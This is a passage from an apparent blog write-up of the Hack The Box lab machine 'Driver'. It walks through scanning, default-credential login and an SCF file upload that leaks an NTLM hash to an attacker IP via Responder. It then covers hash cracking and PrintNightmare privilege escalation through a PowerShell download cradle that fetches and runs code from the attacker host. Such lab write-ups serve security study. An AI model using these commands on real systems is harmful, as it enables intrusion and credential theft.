+</span></span><span style="display:flex;"><span>  445/tcp  open  microsoft-ds Microsoft Windows <span style="color:#ae81ff">7</span> - <span style="color:#ae81ff">10</span> microsoft-ds <span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  |_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>  |_http-title: Not Found
+</span></span><span style="display:flex;"><span>  Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
+</span></span><span style="display:flex;"><span>  OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
+</span></span><span style="display:flex;"><span>  No OS matches <span style="color:#66d9ef">for</span> host
+</span></span><span style="display:flex;"><span>  Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  Host script results:
+</span></span><span style="display:flex;"><span>  |_clock-skew: mean: 6h59m58s, deviation: 0s, median: 6h59m58s
+</span></span><span style="display:flex;"><span>  | smb2-security-mode:
+</span></span><span style="display:flex;"><span>  |   3:1:1:
+</span></span><span style="display:flex;"><span>  |_    Message signing enabled but not required
+</span></span><span style="display:flex;"><span>  | smb2-time:
+</span></span><span style="display:flex;"><span>  |   date: 2024-11-11T16:53:11
+</span></span><span style="display:flex;"><span>  |_  start_date: 2024-11-11T16:45:48
+</span></span><span style="display:flex;"><span>  | smb-security-mode:
+</span></span><span style="display:flex;"><span>  |   account_used: guest
+</span></span><span style="display:flex;"><span>  |   authentication_level: user
+</span></span><span style="display:flex;"><span>  |   challenge_response: supported
+</span></span><span style="display:flex;"><span>  |_  message_signing: disabled <span style="color:#f92672">(</span>dangerous, but default<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>  Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 186.52 seconds</span></span></code></pre></div>
+    
+</div>
+</li>
+<li><strong>Findings</strong>:
+<ul>
+<li>It says above <code>&quot;Please enter password for admin&quot;</code> which means there is some sort of admin panel present I imagine.</li>
+<li>This is not part of a domain as it says it&rsquo;s part of a <code>WORKGROUP</code>:
+<ul>
+<li><code>445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="smb-445">SMB <code>445</code>:</h3>
+<h4 id="attempting-to-connect-with-null-and-guest-sessions">Attempting to connect with NULL &amp; Guest sessions:</h4>
+<ul>
+<li><strong>This is a standard check I always try as alot of the time the guest account or null sessions can lead to a foothold</strong>:
+<ul>
+<li><code>netexec smb $box -u 'guest' -p '' --shares</code></li>
+<li><code>netexec smb $box -u '' -p '' --shares</code></li>
+<li>Both are disabled:
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-11-095350_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>+Discoveries+:
+<ul>
+<li>What is interesting is that it&rsquo;s running <code>SMBv1</code> and we have the windows version also <code>Windows 10 Enterprise 10240 x64</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="rpc">RPC:</h3>
+<ul>
+<li>
+<p>+Cheatsheet+: I have an enumeration &amp; attacking cheatsheet for RPC, available here:</p>
+<ul>
+<li><a href="https://bloodstiller.com/cheatsheets/rpc-cheatsheet/#enumerating-rpc-using-rpcclient">https://bloodstiller.com/cheatsheets/rpc-cheatsheet/#enumerating-rpc-using-rpcclient</a></li>
+</ul>
+</li>
+<li>
+<p><strong>Null session via RPC</strong>:</p>
+<ul>
+<li>Much like SMB you can also connect to RPC via null &amp; guest sessions, let&rsquo;s see if they are valid here:
+<ul>
+<li><code>rpcclient -U &quot;&quot; $box</code></li>
+<li><code>rpcclient -U '%' $box</code></li>
+<li>Both fail.
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-11-110700_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="web-80">Web <code>80</code>:</h3>
+<ul>
+<li><strong>Web Enumeration via Burp Suite</strong>:
+<ul>
+<li>When enumerating a website, always use Burp Suite. This allows you to:</li>
+<li>Record all potential injection points.</li>
+<li>Capture relevant responses for each request, making it easier to analyze vulnerabilities and track your testing progress.</li>
+</ul>
+</li>
+</ul>
+<h4 id="website-overview">Website Overview:</h4>
+<ul>
+<li>Immediately when I try and access the site I am greeted with a basic authentication panel.</li>
+<li>As we saw above it says <code>&quot;Please enter password for admin&quot;</code> I enter default creds of admin:admin and get access.
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-11-100352_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>We can see there is an email address at the bottom too, lets add this to our list:
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-11-102115_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="enumerating-injection-points">Enumerating Injection Points:</h4>
+<ul>
+<li>
+<p>The only viable injection point is the upload page. Where can upload a file that will be manually checked &amp; tested.</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-11-100629_.png">
+</figure>
+</li>
+<li>We may be able to upload a reverse shell.
+<ul>
+<li>We can see the website is running <code>.php</code> so we can use a php reverse web shell.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I use the pentestmonkey one that is on revshells</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-11-101123_.png">
+</figure>
+</li>
+<li>I upload the shell and start my listener:
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-11-101143_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>I do not get a hit though:
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-11-101209_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="directory-enumeration-the-web-server-using-ffuf">Directory Enumeration the web-server using ffuf:</h4>
+<ul>
+<li>
+<p><strong>I Perform some directory busting to see if there are any interesting directories</strong>:</p>
+<ul>
+<li><code>ffuf -w ~/Wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://$box/FUZZ -fc 403 -ic</code></li>
+<li><figure><img src="/ox-hugo/2024-11-11-095525_.png">
+</figure>
+</li>
+<li>Nothing interesting from an unauthenticated session.</li>
+</ul>
+</li>
+<li>
+<p><strong>I try dirbusting with an authenticated session by passing</strong> <code>base64</code> <strong>encoded credentials</strong>:</p>
+<ul>
+<li>Base64 encode our credentials:
+<ul>
+<li><code>echo -n 'admin:admin' | base64</code></li>
+<li><figure><img src="/ox-hugo/2024-11-11-104810_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>Dirbust:
+<ul>
+<li><code>ffuf -w ~/Wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://$box/FUZZ -fc 403 -ic -H &quot;Authorization: Basic YWRtaW46YWRtaW4=&quot;</code></li>
+<li><figure><img src="/ox-hugo/2024-11-11-105314_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>Again nothing of note.</li>
+</ul>
+</li>
+</ul>
+<h2 id="2-dot-foothold">2. Foothold:</h2>
+<h3 id="using-an-scf-file-to-get-a-users-ntlm-hash">Using an SCF File to get a users NTLM hash:</h3>
+<p>As this host allows uploads it may be possible to upload a malicious <code>.scf</code> file to force them to authenticate back to our attack host and send us their NTLM hash.</p>
+<ul>
+<li>
+<p><strong>I save the below as a</strong> <code>.scf</code> <strong>file</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="[Shell]%0aCommand=2%0aIconFile=%5c%5c10.10.14.97%5cshare%5cLasjetJet.ico%0a[Taskbar]%0aCommand=ToggleDesktop">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">[</span>Shell<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Command<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>IconFile<span style="color:#f92672">=</span><span style="color:#ae81ff">\\</span>10.10.14.97<span style="color:#ae81ff">\s</span>hare<span style="color:#ae81ff">\L</span>asjetJet.ico
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Taskbar<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Command<span style="color:#f92672">=</span>ToggleDesktop</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>+Note+:
+<ul>
+<li>I name it <code>@PrinterDriver.scf</code> so it&rsquo;s something similar what would be uploaded so it does not arouse suspicion &amp; looks legitimate.</li>
+<li>Put an <code>@</code> at the start of the name so it appears at the top and ensure it is executed as soon as the user accesses the share it is in. This way the user does not need to click on it and it will trigger.</li>
+<li>This type of attack is typically done with SMB shares.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I start responder</strong>:</p>
+<ul>
+<li><code>sudo responder -wd -v -I tun0</code></li>
+<li><figure><img src="/ox-hugo/2024-11-11-122444_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I upload the</strong> <code>.scf</code>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-11-115315_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I get a hit &amp; get back the user tony&rsquo;s NTLM hash</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-11-115522_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h5 id="scf--shell-command-file--primer">SCF (Shell Command File) Primer:</h5>
+<ul>
+<li>
+<p><strong>Purpose:</strong> Originally designed for quick access to certain Windows system commands, like opening Windows Explorer or the Recycle Bin.</p>
+</li>
+<li>
+<p><strong>File Extension:</strong> <code>.scf</code></p>
+</li>
+<li>
+<p><strong>Format:</strong> Plain text file with commands in a specific format, commonly referencing icon locations.</p>
+</li>
+<li>
+<p><strong>Common Fields:</strong></p>
+<ul>
+<li><code>[Shell]</code> – Header indicating it’s an SCF file.</li>
+<li><code>Command</code> – Specifies the command or action to take, like opening Windows Explorer.</li>
+<li><code>IconFile</code> – Points to an icon resource (e.g., file path or UNC path).</li>
+</ul>
+</li>
+<li>
+<p><strong>Exploitability:</strong></p>
+<ul>
+<li>SCF files can be exploited because Windows automatically renders icon files specified in SCF files.</li>
+<li>By pointing the <strong>IconFile</strong> field to a remote UNC path, an attacker can trigger Windows Explorer to initiate an SMB connection to the specified path, leaking NTLM hashes in the process.</li>
+</ul>
+</li>
+<li>
+<p><strong>Mitigation Tips</strong>:</p>
+<ul>
+<li>Disabling SMBv1 and securing SMB authentication settings can help mitigate risks associated with SCF file exploitation.</li>
+<li>Recent versions of Windows Server (2019+) handle SCF files differently, limiting their exploitability.</li>
+</ul>
+</li>
+</ul>
+<h5 id="scf-exploit-explained">SCF Exploit Explained:</h5>
+<ul>
+<li><strong>SCF File Exploit</strong>:
+<ul>
+<li><code>SCF</code> (Shell Command File&rsquo;s): Can be modified to point its icon file location to a specific UNC (Universal Naming Convention) path, typically an IP address.</li>
+<li><strong>Result of manipulation</strong>:
+<ul>
+<li>Windows Explorer automatically initiates an SMB (Server Message Block) session when accessing the folder with the modified .scf file.</li>
+<li>This action sends the victim&rsquo;s NTLMv2 hash to our attack host.</li>
+</ul>
+</li>
+<li><strong>Exploitation Tools</strong>:
+<ul>
+<li>Tools like Responder, Inveigh, or InveighZero can be used to poison and capture the NTLMv2 hashes sent by the victim.</li>
+<li>+Simplified Explanation+: By putting a malicious <code>.scf</code> file on the target that points to our host the victim will attempt to authenticate back to us and in doing so will send their NTLMv2 hash which we can capture</li>
+</ul>
+</li>
+<li>+Note+:
+<ul>
+<li>If the target system is Windows Server 2019 or newer, an LNK file must be used instead of an SCF file.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="cracking-tony-s-hash-with-hashcat">Cracking Tony&rsquo;s hash with hashcat:</h3>
+<ul>
+<li><strong>I crack it with hashcat</strong>:
+<ul>
+<li><code>hashcat -m 5600 tony.hash /home/kali/Wordlists/rockyou.txt -O</code></li>
+<li><figure><img src="/ox-hugo/2024-11-11-120040_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li><strong>Verify they work</strong>:
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-11-120204_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="enumerating-users-with-rpc">Enumerating Users with RPC:</h3>
+<ul>
+<li>
+<p><strong>I connect using rpcclient and list the users</strong>:</p>
+<ul>
+<li><code>rpcclient -U 'tony' $box</code></li>
+<li><figure><img src="/ox-hugo/2024-11-11-123959_.png">
+</figure>
+</li>
+<li>There are only 2 other users other than tony, Guest (which is disabled and Administrator)</li>
+</ul>
+</li>
+<li>
+<p><strong>I check the description field for the Administrator user in-case there is a password in it etc</strong>:</p>
+<ul>
+<li><code>queryuser 0x1f4</code></li>
+<li><figure><img src="/ox-hugo/2024-11-11-132007_.png">
+</figure>
+</li>
+<li>There isn&rsquo;t :(</li>
+</ul>
+</li>
+</ul>
+<h3 id="enumerating-as-tony">Enumerating as Tony:</h3>
+<ul>
+<li>
+<p><strong>I connect via evil winrm</strong>:</p>
+<ul>
+<li><code>evil-winrm -i $box -u $user -p $pass</code></li>
+</ul>
+</li>
+<li>
+<p><strong>Grab the user flag</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-11-132234_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I check PowerShell history but nothing</strong>:</p>
+<ul>
+<li><code>(Get-PSReadLineOption).HistorySavePath</code></li>
+<li><figure><img src="/ox-hugo/2024-11-11-132505_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Check my privs</strong>:</p>
+<ul>
+<li><code>whoami /priv</code></li>
+<li><figure><img src="/ox-hugo/2024-11-11-132559_.png">
+</figure>
+</li>
+<li>Nothing interesting.</li>
+</ul>
+</li>
+<li>
+<p><strong>I Check the</strong> <code>fw_up.php</code> <strong>and</strong> <code>index.php</code>:</p>
+<ul>
+<li>I check both the website <code>.php</code> files in the web-root(<code>wwwroot</code>) but neither hold anything interesting.
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-11-132908_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="3-dot-privilege-escalation">3. Privilege Escalation:</h2>
+<h3 id="discovering-the-host-is-vulnerable-to-printnightmare-cve-2021-1675">Discovering the host is vulnerable to PrintNightmare CVE-2021-1675:</h3>
+<ul>
+<li><strong>As the box is called</strong> <code>driver</code> <strong>and there have been various nods to printers I check if the it&rsquo;s susceptible to</strong> <code>PrintNightmare</code> <strong>with netexec</strong>:
+<ul>
+<li><code>netexec smb $box -u $user -p $pass -M printnightmare</code></li>
+<li><figure><img src="/ox-hugo/2024-11-11-133623_.png">
+</figure>
+</li>
+<li>It is, lets attack.</li>
+<li>+Note+: I have a priv-esc checklist that I run through when I am working on machines and checking for <code>PrintNightmare</code> is one of these checks (I didn&rsquo;t just magically stumble upon the idea). However now we have a viable path forward.</li>
+</ul>
+</li>
+</ul>
+<h3 id="adding-an-admin-user-using-printnightmare-cve-2021-1675">Adding an Admin User using PrintNightmare CVE-2021-1675:</h3>
+<ul>
+<li>
+<p><strong>Get exploit</strong>:</p>
+<ul>
+<li>Lets get the POC.</li>
+<li><code>wget https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/refs/heads/main/CVE-2021-1675.ps1</code></li>
+<li><figure><img src="/ox-hugo/2024-11-11-135505_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Start python server</strong>:</p>
+<ul>
+<li><code>python3 -m http.server 9000</code></li>
+<li><figure><img src="/ox-hugo/2024-11-11-135448_.png">
+</figure>
+</li>
+<li>+Note+: I have this command aliased to <code>pws</code></li>
+</ul>
+</li>
+<li>
+<p><strong>Use download cradle to load into memory</strong>:</p>
+<ul>
+<li><code>iex(new-object net.webclient).downloadstring('http://10.10.14.97:9000/CVE-2021-1675.ps1')</code></li>
+<li><figure><img src="/ox-hugo/2024-11-11-135533_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>+Deep Dive+: I have a deep dive into download cradles and how they work:</p>
+<ul>
+<li><a href="https://bloodstiller.com/articles/understandingdownloadcradles/">https://bloodstiller.com/articles/understandingdownloadcradles/</a></li>
+</ul>
+</li>
+<li>
+<p><strong>Create new user &amp; add them to the admins</strong>:</p>
+<ul>
+<li><code>Invoke-Nightmare -NewUser &quot;bloodstiller&quot; -NewPassword &quot;bl00dst1ll3r!&quot; -DriverName &quot;PrintIt&quot;</code></li>
+<li><figure><img src="/ox-hugo/2024-11-11-135700_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Verify the user has been added</strong>:</p>
+<ul>
+<li><code>net user bloodstiller</code></li>
+<li><figure><img src="/ox-hugo/2024-11-11-135721_.png">
+</figure>
+</li>
+<li>They have been.</li>
+</ul>
+</li>
+<li>
+<p><strong>Verify the creds work</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-11-140555_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Get flag</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-11-140758_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Dump hashes with impacket-secretsdump</strong>:</p>
+<ul>
+<li><code>impacket-secretsdump $domain/$user:$pass@$box</code></li>
+<li><figure><img src="/ox-hugo/2024-11-11-140935_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="lessons-learned">Lessons Learned:</h2>
+<h3 id="what-did-i-learn">What did I learn?</h3>
+<ol>
+<li>It took me a long time to see you could upload an SCF so long as it was being accessed from a share/etc it would work.</li>
+</ol>
+<h3 id="what-silly-mistakes-did-i-make">What silly mistakes did I make?</h3>
+<ol>
+<li>Not too many, may be getting better, here&rsquo;s hoping.</li>
+</ol>
+<h2 id="sign-off">Sign off:</h2>
+<p>Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!</p>
+<p>Until next time, hack the planet!</p>
+<p>– Bloodstiller</p>
+<p>– Get in touch bloodstiller at proton dot me</p>
+
+            
+        </div>
+    </article>
+
+        </main>
+
+        <footer class="footer">
+    <div class="footer-left">
+        <ul class="social">
+            
+                <li>All Rights Reserved ®.</li>
+            
+
+            
+                <li>Bloodstiller</li>
+            
+
+            
+                
+            
+                
+            
+                
+                    <li>
+                        
+                            <a href="https://github.com/bloodstiller" target="_blank">
+                                <i class="bi-github"></i>
+                            </a>
+                        
+
+                    </li>
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+        </ul>
+    </div>
+
+    <div class="footer-right">
+        <ul class="control status clearfix">
+            
+                <li>
+                    
+                        Word Count:
+                        1818
+                    
+                </li>
+            
+
+
+            
+                <li>en</li>
+            
+
+            
+
+            
+
+            
+                <li>
+                    
+                        Last modified: &nbsp;
+                        <time>
+                            Nov 12 2024 00:00:00
+                        </time>
+                    
+                </li>
+            
+
+            
+        </ul>
+    </div>
+</footer>
+
+    </body>
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/codeblock_copy.c59588ba3a219dafab515508b0bcd2d0592dc9e0e08de20dc1983bfd8cb69d03d37c78eadd81ee7bef724570f9e4286d9ea1c53ca59d3711c0bcad9e9134d0e9.js"
+            integrity="sha512-xZWIujohna&#43;rUVUIsLzS0FktyeDgjeINwZg7/Yy2nQPTfHjq3YHue&#43;9yRXD55ChtnqHFPKWdNxHAvK2ekTTQ6Q=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/custom.e55ae031ca7d8c1e9bde9a72058dd382e3de5ff9b7df41d6d0e4ccb82ff9962e74b4865412dc15db16e5f16012d5cf9e2330b9826a3a36d5a272077f70e1341b.js"
+            integrity="sha512-5VrgMcp9jB6b3ppyBY3TguPeX/m330HW0OTMuC/5li50tIZUEtwV2xbl8WAS1c&#43;eIzC5gmo6NtWicgd/cOE0Gw=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/dir_toggle.e6f8c63f3ed9aefa9cedb3be3d5ab67e00bc3cf87a8dd7ef1ed55d642e9a7d80837636a26ae77f967f2aa74a44ae70c4134e25abca587f048c60807ba9e9c82f.js"
+            integrity="sha512-5vjGPz7Zrvqc7bO&#43;PVq2fgC8PPh6jdfvHtVdZC6afYCDdjaiaud/ln8qp0pErnDEE04lq8pYfwSMYIB7qenILw=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/sidebar.01b59c615736643387108a100de70c51d5e98477bdc338244a87d37f7e38286b48683459eade68087f0688f0235e7a48691e633954fa930d41823e9ddf797085.js"
+            integrity="sha512-AbWcYVc2ZDOHEIoQDecMUdXphHe9wzgkSofTf344KGtIaDRZ6t5oCH8GiPAjXnpIaR5jOVT6kw1Bgj6d33lwhQ=="></script>
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link
+    rel="stylesheet"
+    href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css" />
+
+
+
+
+</html>
